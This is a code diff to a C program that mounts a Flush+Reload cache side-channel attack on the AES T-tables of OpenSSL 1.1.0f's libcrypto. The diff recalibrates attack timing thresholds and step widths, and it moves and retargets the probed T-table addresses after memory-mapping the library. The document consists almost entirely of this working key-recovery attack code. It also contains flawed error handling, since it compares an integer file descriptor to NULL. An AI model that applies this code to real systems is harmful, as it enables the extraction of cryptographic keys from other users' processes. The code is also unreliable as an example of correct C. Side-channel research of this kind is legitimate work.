@@ -42,16 +42,14 @@ int burst_gap = 400;
 
 // TODO: Attack specific parameters, change it as per calibration results
 int regular_gap = 400;
-int step_width = 19760; 
+int step_width = 3850; 
 
 #define T_ARRAY_SIZE (1)
 int tl_array[T_ARRAY_SIZE] = {30};
-int th_array[T_ARRAY_SIZE] = {230};
+int th_array[T_ARRAY_SIZE] = {200};
 
-// TODO: Memory addresses to probe, change it as per T-Table addresses
-char* probe[] = { 
-base + 0x1d3920, base + 0x1d3d20, base + 0x1d4120, base + 0x1d4520
-};
+char* base;
+
 
 // TODO: Optional- change baseline F+R threshold as per baseline calibration results
 int flush_reload_threshold = (th_array[T_ARRAY_SIZE-1]+tl_array[T_ARRAY_SIZE]-1)/2;
@@ -256,7 +254,6 @@ unsigned char key[] =
 size_t sum;
 size_t scount;
 
-char* base;
 char* end;
 
 int bot_elems(double *arr, int N, int *bot, int n) {
@@ -344,6 +341,12 @@ int main(int argc, char *argv[])
     }
 
     int fd = open("./openssl-1.1.0f/build/lib/libcrypto.so", O_RDONLY);
+    if (fd == NULL) {
+        printf("error %d: %s\n", errno, strerror(errno));
+        // error handling, exit or return
+    }
+    // fprintf(fd, "3"); 
+
     size_t size = lseek(fd, 0, SEEK_END);
     if (size == 0)
     exit(-1);
@@ -354,6 +357,10 @@ int main(int argc, char *argv[])
     map_size += 1;
     }
     base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+    // TODO: Memory addresses to probe, change it as per T-Table addresses
+    char* probe[] = { 
+    base + 0x1df000, base + 0x1df400, base + 0x1df800, base + 0x1dfc00
+    };
     end = base + size;
 
     unsigned char plaintext[] =
